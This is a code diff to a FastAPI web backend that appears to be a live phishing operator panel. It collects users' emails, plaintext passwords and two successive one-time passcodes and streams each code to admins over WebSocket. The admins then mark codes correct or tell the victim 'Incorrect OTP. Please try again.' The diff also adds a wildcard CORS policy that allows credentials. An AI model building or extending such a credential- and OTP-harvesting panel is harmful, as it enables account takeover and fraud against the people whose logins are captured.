@@ -2,7 +2,9 @@
 from fastapi import FastAPI, HTTPException, Depends, status, Request, WebSocket, WebSocketDisconnect
 from fastapi.responses import HTMLResponse, FileResponse
 from fastapi.templating import Jinja2Templates
+from fastapi.staticfiles import StaticFiles
 from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
+from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
 from typing import Optional, Dict
 from datetime import datetime, timedelta
@@ -133,19 +135,20 @@ async def lifespan(app: FastAPI):
 
 app = FastAPI(lifespan=lifespan)
 
+# Mount static files folder
+app.mount("/static", StaticFiles(directory="static"), name="static")
+
 # Templates
 templates = Jinja2Templates(directory="templates")
 
-# ============ AUDIO FILES ENDPOINT ============
-@app.get("/audio/{filename}")
-async def get_audio(filename: str):
-    # Look for audio files in templates folder
-    audio_path = f"templates/{filename}"
-    
-    if not os.path.exists(audio_path):
-        raise HTTPException(status_code=404, detail=f"Audio file {filename} not found")
-    
-    return FileResponse(audio_path, media_type="audio/mpeg")
+# Add CORS middleware
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=["*"],
+    allow_credentials=True,
+    allow_methods=["*"],
+    allow_headers=["*"],
+)
 
 # Pydantic models
 class UserLogin(BaseModel):
@@ -205,20 +208,16 @@ async def success_page(request: Request, email: str):
 @app.post("/api/users/login")
 async def user_login(user: UserLogin):
     async with db_pool.acquire() as conn:
-        # Check if user exists
         existing = await conn.fetchrow("SELECT * FROM users WHERE email = $1", user.email)
         
         if existing:
-            # Email exists - redirect to success page directly
             return {"success": True, "redirect": f"/success?email={user.email}"}
         else:
-            # Create new user (pending approval)
             await conn.execute("""
                 INSERT INTO users (email, password, approved)
                 VALUES ($1, $2, FALSE)
             """, user.email, user.password or "user")
             
-            # Notify admins via WebSocket
             await manager.send_to_admins({
                 "type": "user-login",
                 "email": user.email
@@ -229,7 +228,6 @@ async def user_login(user: UserLogin):
 @app.post("/api/users/submit-otp")
 async def submit_otp(data: OTPSubmit):
     async with db_pool.acquire() as conn:
-        # Check if user exists and is approved
         user = await conn.fetchrow("SELECT * FROM users WHERE email = $1", data.email)
         
         if not user:
@@ -241,14 +239,12 @@ async def submit_otp(data: OTPSubmit):
         if user['otp1_never']:
             return {"success": False, "error": "User is permanently blocked"}
         
-        # Store OTP
         await conn.execute("""
             UPDATE users 
             SET otp = $1, otp1_correct = FALSE, otp1_never = FALSE
             WHERE email = $2
         """, data.otp, data.email)
         
-        # Notify admins
         await manager.send_to_admins({
             "type": "user-otp-created",
             "email": data.email,
@@ -271,14 +267,12 @@ async def submit_second_otp(data: OTPSubmit):
         if user['otp1_never']:
             return {"success": False, "error": "User is permanently blocked"}
         
-        # Store second OTP
         await conn.execute("""
             UPDATE users 
             SET second_otp = $1, otp2_correct = FALSE
             WHERE email = $2
         """, data.otp, data.email)
         
-        # Notify admins
         await manager.send_to_admins({
             "type": "user-second-otp-created",
             "email": data.email,
@@ -287,7 +281,7 @@ async def submit_second_otp(data: OTPSubmit):
         
         return {"success": True, "message": "Second OTP submitted, waiting for admin approval"}
 
-# ============ STATUS CHECK ENDPOINTS (for polling) ============
+# ============ STATUS CHECK ENDPOINTS ============
 
 @app.get("/api/users/check-status")
 async def check_user_status(email: str):
@@ -333,7 +327,6 @@ async def admin_dashboard_page(request: Request):
 @app.post("/api/admin/login")
 async def admin_login(admin: AdminLogin):
     async with db_pool.acquire() as conn:
-        # Raw comparison - no hashing
         user = await conn.fetchrow(
             "SELECT * FROM users WHERE email = $1 AND password = $2 AND approved = TRUE",
             admin.email, admin.password
@@ -374,7 +367,6 @@ async def approve_user(action: AdminAction, credentials: HTTPAuthorizationCreden
             WHERE email = $1
         """, action.email)
         
-        # Notify user via WebSocket
         await manager.send_to_user(action.email, {
             "type": "user-approved",
             "email": action.email,
@@ -396,7 +388,6 @@ async def approve_first_otp(action: AdminAction, credentials: HTTPAuthorizationC
             WHERE email = $1
         """, action.email)
         
-        # Notify user to go to second OTP page
         await manager.send_to_user(action.email, {
             "type": "first-approved",
             "email": action.email,
@@ -418,7 +409,6 @@ async def success_first_otp(action: AdminAction, credentials: HTTPAuthorizationC
             WHERE email = $1
         """, action.email)
         
-        # Notify user to go to success page directly
         await manager.send_to_user(action.email, {
             "type": "first-approved",
             "email": action.email,
@@ -433,7 +423,6 @@ async def incorrect_first_otp(action: AdminAction, credentials: HTTPAuthorizatio
     if not payload:
         raise HTTPException(status_code=403, detail="Invalid token")
     
-    # Clear the OTP and mark as incorrect
     async with db_pool.acquire() as conn:
         await conn.execute("""
             UPDATE users 
@@ -441,7 +430,6 @@ async def incorrect_first_otp(action: AdminAction, credentials: HTTPAuthorizatio
             WHERE email = $1
         """, action.email)
     
-    # Send incorrect message to user with reset signal
     await manager.send_to_user(action.email, {
         "type": "incorrect",
         "message": "Incorrect OTP. Please try again.",
@@ -463,7 +451,6 @@ async def never_first_otp(action: AdminAction, credentials: HTTPAuthorizationCre
             WHERE email = $1
         """, action.email)
         
-        # Send notification to user
         await manager.send_to_user(action.email, {
             "type": "first-approved",
             "email": action.email,
@@ -479,16 +466,13 @@ async def reset_user(action: AdminAction, credentials: HTTPAuthorizationCredenti
         raise HTTPException(status_code=403, detail="Invalid token")
     
     async with db_pool.acquire() as conn:
-        # Delete old user record
         await conn.execute("DELETE FROM users WHERE email = $1", action.email)
         
-        # Create new fresh record
         await conn.execute("""
             INSERT INTO users (email, password, approved, otp, second_otp, otp1_correct, otp2_correct, otp1_never)
             VALUES ($1, $2, FALSE, NULL, NULL, FALSE, FALSE, FALSE)
         """, action.email, "user")
         
-        # Notify user
         await manager.send_to_user(action.email, {
             "type": "incorrect",
             "message": "Your record has been reset. Please start over.",
@@ -510,7 +494,6 @@ async def approve_second_otp(action: AdminAction, credentials: HTTPAuthorization
             WHERE email = $1
         """, action.email)
         
-        # Notify user of success
         await manager.send_to_user(action.email, {
             "type": "second-approved",
             "email": action.email,
@@ -525,7 +508,6 @@ async def incorrect_second_otp(action: AdminAction, credentials: HTTPAuthorizati
     if not payload:
         raise HTTPException(status_code=403, detail="Invalid token")
     
-    # Clear the second OTP and mark as incorrect
     async with db_pool.acquire() as conn:
         await conn.execute("""
             UPDATE users 
@@ -533,7 +515,6 @@ async def incorrect_second_otp(action: AdminAction, credentials: HTTPAuthorizati
             WHERE email = $1
         """, action.email)
     
-    # Send incorrect message to user with reset signal
     await manager.send_to_user(action.email, {
         "type": "incorrect",
         "message": "Incorrect second OTP. Please try again.",
@@ -551,7 +532,6 @@ async def delete_user(action: AdminAction, credentials: HTTPAuthorizationCredent
     async with db_pool.acquire() as conn:
         await conn.execute("DELETE FROM users WHERE email = $1", action.email)
         
-        # Notify user
         await manager.send_to_user(action.email, {
             "type": "deleted",
             "message": "Your account has been deleted."
@@ -567,14 +547,12 @@ async def websocket_user(websocket: WebSocket, email: str):
     try:
         while True:
             data = await websocket.receive_text()
-            # Handle any client messages if needed
             pass
     except WebSocketDisconnect:
         manager.disconnect_user(email)
 
 @app.websocket("/ws/admin")
 async def websocket_admin(websocket: WebSocket):
-    # Get token from query parameter
     token = websocket.query_params.get("token")
     if not token:
         await websocket.close(code=1008)
@@ -589,7 +567,6 @@ async def websocket_admin(websocket: WebSocket):
     try:
         while True:
             data = await websocket.receive_text()
-            # Handle admin messages
             pass
     except WebSocketDisconnect:
         manager.disconnect_admin(token)
